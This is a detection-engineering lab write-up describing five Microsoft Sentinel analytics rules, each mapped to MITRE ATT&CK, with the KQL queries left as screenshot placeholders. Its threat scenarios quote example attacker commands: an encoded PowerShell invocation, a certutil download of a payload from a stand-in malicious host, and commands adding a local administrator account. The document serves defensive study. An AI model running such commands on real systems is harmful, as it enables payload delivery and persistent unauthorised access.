# Day 8 – Detection Engineering: Building Enterprise Security Analytics Rules

## Overview

This stage of the lab focuses on detection engineering within Microsoft Sentinel, where custom analytics rules are created to detect attacker behaviours commonly observed in enterprise environments.

The goal is to demonstrate how SOC analysts translate attacker techniques into practical detection logic using KQL queries and Defender telemetry.

The rules developed in this lab focus on identifying:

- PowerShell abuse
- Malicious Office macro execution
- Living-Off-The-Land binary abuse
- Privilege escalation through account creation
- Suspicious outbound network communication

Each detection rule includes:

- Threat scenario
- MITRE ATT&CK mapping
- KQL detection logic
- Rule implementation within Microsoft Sentinel
- Potential automation response options


------------------------------------------------------------

DETECTION RULE 1 – SUSPICIOUS POWERSHELL EXECUTION FLAGS

Rule Creation

(Insert screenshot – Rule creation page here)


Threat Scenario

PowerShell is commonly abused by attackers to execute malicious scripts directly in memory. This allows adversaries to bypass traditional antivirus detection mechanisms.

Attackers frequently use suspicious command line flags such as:

-EncodedCommand
-ExecutionPolicy Bypass
-NoProfile
-WindowStyle Hidden

These options allow scripts to execute without standard security restrictions and hide malicious payloads using Base64 encoding.

Example attacker command:

powershell.exe -EncodedCommand <Base64Payload>


MITRE ATT&CK Mapping

T1059.001 – Command and Scripting Interpreter: PowerShell


Detection Query

(Insert screenshot – KQL query here)


Why the KQL Detection Works

This query searches endpoint process telemetry using the DeviceProcessEvents table.

The detection works by identifying:

1. Processes where the executed binary is powershell.exe
2. Command line arguments containing suspicious execution flags
3. Relevant investigation fields including device name, user account, command line arguments and parent process.

These indicators are commonly associated with malicious script execution used in phishing attacks, malware delivery and ransomware staging.


Rule Visible in Microsoft Defender / Sentinel

(Insert screenshot – Rule visible in Defender here)


Potential Automation Options

In production SOC environments, this detection could trigger automated response actions such as:

- isolating the compromised endpoint
- blocking malicious PowerShell scripts
- triggering investigation playbooks
- notifying the SOC team


------------------------------------------------------------

DETECTION RULE 2 – OFFICE APPLICATION SPAWNING POWERSHELL

Rule Creation

(Insert screenshot – Rule creation page here)


Threat Scenario

Attackers often deliver malicious Microsoft Office documents containing embedded macros. When a user opens the document, the macro may execute PowerShell commands to download and run malware.

A common malicious process chain looks like:

WINWORD.exe → powershell.exe
EXCEL.exe → powershell.exe
OUTLOOK.exe → powershell.exe

This behaviour is unusual during normal user activity and is a strong indicator of macro-based malware.


MITRE ATT&CK Mapping

T1204 – User Execution
T1059.001 – PowerShell


Detection Query

(Insert screenshot – KQL query here)


Why the KQL Detection Works

The query identifies PowerShell processes where the parent process is a Microsoft Office application.

Using Defender telemetry from DeviceProcessEvents, the rule checks whether the executed process is PowerShell and whether the initiating process is Word, Excel or Outlook.

Since Office applications rarely spawn PowerShell during legitimate activity, this behaviour may indicate macro-based malware execution.


Rule Visible in Microsoft Defender / Sentinel

(Insert screenshot – Rule visible in Defender here)


Potential Automation Options

Possible automated responses could include:

- isolating the endpoint that opened the malicious document
- blocking the associated file hash
- triggering email threat investigation workflows
- alerting SOC analysts for further investigation


------------------------------------------------------------

DETECTION RULE 3 – LIVING OFF THE LAND BINARY (LOLBIN) ABUSE

Rule Creation

(Insert screenshot – Rule creation page here)


Threat Scenario

Attackers frequently abuse legitimate Windows binaries to execute malicious actions without dropping custom malware. These tools are known as Living-Off-The-Land Binaries (LOLBins).

Common examples include:

mshta.exe
rundll32.exe
certutil.exe

Example malicious usage:

certutil -urlcache -split -f http://malicious-site payload.exe

Because these binaries are trusted system tools, they can bypass many traditional security controls.


MITRE ATT&CK Mapping

T1218 – Signed Binary Proxy Execution


Detection Query

(Insert screenshot – KQL query here)


Why the KQL Detection Works

This query monitors execution of commonly abused Windows binaries using the DeviceProcessEvents table.

The rule searches for processes where the executed binary matches known LOLBINs such as mshta.exe, rundll32.exe and certutil.exe.

These binaries are frequently used in post-exploitation frameworks and malware delivery chains.


Rule Visible in Microsoft Defender / Sentinel

(Insert screenshot – Rule visible in Defender here)


Potential Automation Options

Automation could include:

- blocking execution of suspicious binaries
- isolating affected hosts
- triggering host investigation playbooks
- alerting the SOC team


------------------------------------------------------------

DETECTION RULE 4 – NEW LOCAL ACCOUNT CREATION

Rule Creation

(Insert screenshot – Rule creation page here)


Threat Scenario

After compromising a system, attackers often create new user accounts to maintain persistence or escalate privileges.

Example commands used by attackers:

net user attacker Password123 /add
net localgroup administrators attacker /add


MITRE ATT&CK Mapping

T1136 – Create Account


Detection Query

(Insert screenshot – KQL query here)


Why the KQL Detection Works

This detection monitors account creation activity using the DeviceEvents table.

The query filters events where the ActionType indicates that a new account has been created.

Returned fields include the device name, newly created account, user responsible for creating the account and timestamp of the event.

Unexpected account creation activity may indicate attacker persistence or privilege escalation.


Rule Visible in Microsoft Defender / Sentinel

(Insert screenshot – Rule visible in Defender here)


Potential Automation Options

Possible automated responses include:

- disabling the suspicious account
- forcing password resets
- initiating host investigation workflows
- notifying security analysts


------------------------------------------------------------

DETECTION RULE 5 – SUSPICIOUS EXTERNAL NETWORK CONNECTIONS

Rule Creation

(Insert screenshot – Rule creation page here)


Threat Scenario

Malware frequently communicates with external command-and-control (C2) servers after initial compromise.

Indicators of suspicious behaviour include:

- repeated outbound connections
- connections to unfamiliar external IP addresses
- unusually high connection volumes


MITRE ATT&CK Mapping

T1071 – Application Layer Protocol


Detection Query

(Insert screenshot – KQL query here)


Why the KQL Detection Works

This query analyses network telemetry from the DeviceNetworkEvents table.

The detection identifies endpoints generating a large number of connections to external public IP addresses.

By summarizing connection counts per device and remote IP, the rule highlights systems communicating excessively with external hosts which may indicate command-and-control traffic.


Rule Visible in Microsoft Defender / Sentinel

(Insert screenshot – Rule visible in Defender here)


Potential Automation Options

Automated response actions may include:

- blocking outbound connections to suspicious IP addresses
- isolating the affected endpoint
- initiating network investigation playbooks
- alerting SOC analysts


------------------------------------------------------------

Key Takeaways

This detection engineering exercise demonstrates how SOC analysts design practical security monitoring rules based on attacker techniques and available telemetry.

Skills demonstrated in this lab include:

- writing KQL detection queries
- mapping detections to MITRE ATT&CK techniques
- implementing custom Microsoft Sentinel analytics rules
- designing detection logic for real-world attacker behaviours
- understanding how automation can enhance incident response workflows
